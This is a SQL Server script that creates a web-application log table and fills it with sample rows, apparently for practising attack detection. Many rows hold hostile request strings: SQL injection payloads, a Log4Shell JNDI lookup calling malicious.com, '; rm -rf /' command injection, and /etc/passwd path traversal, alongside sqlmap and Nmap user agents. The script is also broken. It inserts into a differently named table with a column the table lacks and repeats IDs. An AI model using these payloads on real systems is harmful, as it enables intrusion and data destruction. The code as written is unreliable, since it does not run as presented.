
-- Create table if it doesn't already exist
IF OBJECT_ID('dbo.web_application_logs', 'U') IS NOT NULL
    DROP TABLE dbo.web_application_logs;
GO

CREATE TABLE dbo.web_application_logs (
    timestamp DATETIME,
    user_id INT,
    ip_address VARCHAR(255),
    resource VARCHAR(255),
    http_method VARCHAR(10),
    response_code INT,
    user_agent VARCHAR(255),
    query VARCHAR(MAX)
);
GO

  -- Populate the table with sample data 
INSERT INTO web_application (log_id, timestamp, user_id, ip_address, resource, http_method, response_code, user_agent, query) VALUES
(1, '2025-06-20 19:10:47', NULL, N'18.60.203.1', N'/login', N'POST', 500, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username='' OR 1=1 LIMIT 1 OFFSET 1--&password=x'),
(2, '2025-06-20 20:53:47', NULL, N'140.112.105.101', N'/login', N'POST', 401, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username=admin'' OR ''1''=''1&password=pass'),
(39, '2025-06-21 21:54:53', N'user_8364', N'192.168.1.203', N'/search', N'GET', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(3, '2025-06-20 22:41:47', NULL, N'18.60.203.1', N'/login', N'POST', 403, N'python-requests/2.28', N'username='' OR EXISTS(SELECT * FROM users)--&password=x'),
(4, '2025-06-20 22:46:47', NULL, N'196.251.85.74', N'/login', N'POST', 403, N'curl/7.81.0', N'username=admin''/*&password=x'),
(25, '2025-06-21 06:24:53', N'user_4941', N'192.168.1.230', N'/home', N'POST', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(5, '2025-06-21 00:08:47', NULL, N'116.118.104.42', N'/login', N'POST', 401, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username=admin''/*&password=x'),
(6, '2025-06-21 01:15:47', NULL, N'77.83.207.167', N'/login', N'POST', 403, N'curl/7.81.0', N'username=admin@example.com&password='' OR 1=1--'),
(7, '2025-06-21 01:36:47', NULL, N'144.172.73.21', N'/login', N'POST', 401, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username=admin'' --&password=irrelevant'),
(36, '2025-06-21 13:37:53', N'user_4458', N'192.168.1.229', N'/search', N'GET', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(8, '2025-06-21 01:36:47', NULL, N'77.83.207.167', N'/login', N'POST', 401, N'sqlmap/1.4.12.15#dev', N'username='' UNION SELECT NULL, NULL--&password=x'),
(9, '2025-06-21 02:16:47', NULL, N'185.93.89.118', N'/login', N'POST', 500, N'sqlmap/1.4.12.15#dev', N'username=admin@example.com&password='' OR 1=1--'),
(10, '2025-06-21 02:23:47', NULL, N'204.76.203.208', N'/login', N'POST', 403, N'sqlmap/1.4.12.15#dev', N'username=admin'' OR ''1''=''1&password=pass'),
(11, '2025-06-21 03:34:47', NULL, N'116.118.104.42', N'/login', N'POST', 500, N'sqlmap/1.4.12.15#dev', N'username='' UNION SELECT NULL, NULL--&password=x'),
(12, '2025-06-21 04:12:47', NULL, N'196.251.70.87', N'/login', N'POST', 403, N'curl/7.81.0', N'username='' OR 1=1 LIMIT 1 OFFSET 1--&password=x'),
(13, '2025-06-21 06:02:53', N'user_2891', N'177.165.114.174', N'/profile/view', N'GET', 302, N'Mozilla/5.0 (Linux; Android 9)', N''),
(14, '2025-06-21 06:24:53', N'user_4941', N'78.58.213.38', N'/home', N'POST', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(15, '2025-06-21 06:40:53', N'user_5652', N'250.171.151.159', N'/search', N'POST', 200, N'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', N''),
(22, '2025-06-21 17:23:53', N'user_8209', N'192.168.1.176', N'/logout', N'GET', 302, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(34, '2025-06-21 09:23:53', N'user_9600', N'192.168.1.217', N'/home', N'POST', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(16, '2025-06-21 07:46:53', N'user_4235', N'224.121.70.163', N'/cart', N'GET', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(17, '2025-06-21 07:56:53', N'user_5506', N'149.238.50.238', N'/home', N'GET', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(18, '2025-06-21 09:01:47', NULL, N'92.118.39.237', N'/login', N'POST', 403, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username=anything'' OR ''x''=''x&password=123'),
(19, '2025-06-21 09:11:44', NULL, N'77.83.207.167', N'/api/data', N'POST', 200, N'curl/7.68.0', N'${jndi:ldap://malicious.com/a}'),
(20, '2025-06-21 09:19:44', NULL, N'92.118.39.237', N'/dashboard', N'PUT', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N'1; DROP TABLE users'),
(21, '2025-06-21 09:19:53', N'user_5518', N'234.83.61.235', N'/profile/view', N'POST', 302, N'Mozilla/5.0 (Linux; Android 9)', N''),
(40, '2025-06-21 14:13:53', N'user_6202', N'192.168.1.52', N'/register', N'POST', 302, N'Mozilla/5.0 (Linux; Android 9)', N''),
(22, '2025-06-21 09:23:53', N'user_9600', N'216.78.79.97', N'/home', N'POST', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(23, '2025-06-21 09:35:53', N'user_7475', N'55.91.179.72', N'/products/456', N'POST', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(24, '2025-06-21 09:38:47', NULL, N'140.112.105.101', N'/login', N'POST', 401, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username=admin'' AND SLEEP(5)--&password=x'),
(25, '2025-06-21 11:14:47', NULL, N'92.118.39.237', N'/login', N'POST', 403, N'curl/7.81.0', N'username=admin@example.com&password=''; DROP TABLE users;--'),
(26, '2025-06-21 12:12:53', N'user_1623', N'82.73.21.98', N'/contact', N'POST', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(27, '2025-06-21 13:28:53', N'user_5170', N'97.71.185.250', N'/cart', N'GET', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(28, '2025-06-21 13:37:53', N'user_4458', N'129.215.102.189', N'/search', N'GET', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(27, '2025-06-21 13:28:53', N'user_5170', N'192.168.1.197', N'/cart', N'GET', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(24, '2025-06-21 07:46:53', N'user_4235', N'192.168.1.206', N'/cart', N'GET', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(29, '2025-06-21 13:40:53', N'user_3028', N'67.147.202.211', N'/search', N'GET', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(21, '2025-06-21 09:19:53', N'user_5518', N'192.168.1.30', N'/profile/view', N'POST', 302, N'Mozilla/5.0 (Linux; Android 9)', N''),
(26, '2025-06-21 22:39:53', N'user_1221', N'192.168.1.100', N'/profile/update', N'POST', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(28, '2025-06-21 12:12:53', N'user_1623', N'192.168.1.3', N'/contact', N'POST', 200, N'Mozilla/5.0 (Linux; Android 9)', N''),
(33, '2025-06-21 13:40:53', N'user_3028', N'192.168.1.26', N'/search', N'GET', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(35, '2025-06-21 06:02:53', N'user_2891', N'192.168.1.244', N'/profile/view', N'GET', 302, N'Mozilla/5.0 (Linux; Android 9)', N''),
(30, '2025-06-21 14:13:53', N'user_6202', N'214.59.185.181', N'/register', N'POST', 302, N'Mozilla/5.0 (Linux; Android 9)', N''),
(31, '2025-06-21 15:03:44', NULL, N'116.118.104.42', N'/search', N'POST', 404, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N'; rm -rf /'),
(37, '2025-06-21 09:35:53', N'user_7475', N'192.168.1.253', N'/products/456', N'POST', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(32, '2025-06-21 15:19:47', NULL, N'89.222.109.19', N'/login', N'POST', 500, N'sqlmap/1.4.12.15#dev', N'username=admin'' AND SLEEP(5)--&password=x'),
(33, '2025-06-21 16:09:47', NULL, N'188.225.39.116', N'/login', N'POST', 403, N'sqlmap/1.4.12.15#dev', N'username=admin'' --&password=irrelevant'),
(23, '2025-06-21 06:40:53', N'user_5652', N'192.168.1.154', N'/search', N'POST', 200, N'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', N''),
(34, '2025-06-21 17:01:53', N'user_3374', N'45.44.191.215', N'/recommendations', N'GET', 302, N'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', N''),
(35, '2025-06-21 17:19:44', NULL, N'196.251.85.74', N'/register', N'DELETE', 404, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N'../../../etc/passwd'),
(36, '2025-06-21 17:19:44', NULL, N'196.251.70.87', N'/products/123', N'GET', 200, N'python-requests/2.25.1', N'; rm -rf /'),
(37, '2025-06-21 17:23:53', N'user_8209', N'32.217.99.221', N'/logout', N'GET', 302, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(38, '2025-06-21 20:59:53', N'user_8967', N'192.168.1.31', N'/cart', N'POST', 302, N'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', N''),
(38, '2025-06-21 17:31:53', N'user_7341', N'75.72.199.83', N'/home', N'GET', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(39, '2025-06-21 18:13:47', NULL, N'185.116.236.151', N'/login', N'POST', 403, N'Mozilla/5.0 (compatible; Nmap Scripting Engine; Linux)', N'username='' OR EXISTS(SELECT * FROM users)--&password=x'),
(40, '2025-06-21 18:49:44', NULL, N'140.112.105.101', N'/products', N'POST', 404, N'sqlmap/1.4.12.15#dev', N'; rm -rf /'),
(30, '2025-06-21 22:05:53', N'user_8398', N'192.168.1.196', N'/dashboard', N'POST', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(31, '2025-06-21 17:01:53', N'user_3374', N'192.168.1.143', N'/recommendations', N'GET', 302, N'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', N''),
(32, '2025-06-21 17:31:53', N'user_7341', N'192.168.1.243', N'/home', N'GET', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(41, '2025-06-21 19:52:47', NULL, N'196.251.83.25', N'/login', N'POST', 500, N'sqlmap/1.4.12.15#dev', N'username=admin@example.com&password=''; DROP TABLE users;--'),
(42, '2025-06-21 20:59:53', N'user_8967', N'118.224.174.134', N'/cart', N'POST', 302, N'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', N''),
(29, '2025-06-21 07:56:53', N'user_5506', N'192.168.1.69', N'/home', N'GET', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(43, '2025-06-21 21:46:44', NULL, N'144.172.73.21', N'/settings', N'PUT', 404, N'Nmap Scripting Engine', N'../../../etc/passwd'),
(44, '2025-06-21 21:54:53', N'user_8364', N'33.55.92.113', N'/search', N'GET', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(45, '2025-06-21 22:05:53', N'user_8398', N'16.240.167.77', N'/dashboard', N'POST', 200, N'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', N''),
(46, '2025-06-21 22:39:53', N'user_1221', N'183.138.171.177', N'/profile/update', N'POST', 200, N'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', N''),
(47, '2025-06-21 23:03:47', NULL, N'204.76.203.208', N'/login', N'POST', 500, N'python-requests/2.28', N'username=anything'' OR ''x''=''x&password=123');
